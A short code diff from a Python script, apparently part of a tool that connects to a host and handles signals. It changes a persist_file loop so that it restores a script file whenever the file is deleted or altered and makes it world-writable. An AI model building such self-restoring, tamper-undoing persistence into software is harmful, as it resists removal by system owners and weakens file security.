@@ -56,10 +56,12 @@ def connect_to_host():
 def persist_file():
     while True:
         if os.path.exists(SCRIPT_PATH):
-            time.sleep(1)
-            continue
-        with open(SCRIPT_PATH, 'w') as file:
-            file.write(SCRIPT_CONTENT)
+            with open(SCRIPT_PATH, 'r') as file_r:
+                if file_r.read() == SCRIPT_CONTENT:
+                    time.sleep(1)
+                    continue
+        with open(SCRIPT_PATH, 'w') as file_w:
+            file_w.write(SCRIPT_CONTENT)
             os.chmod(SCRIPT_PATH, 0o777)
 
 def handle_signals():
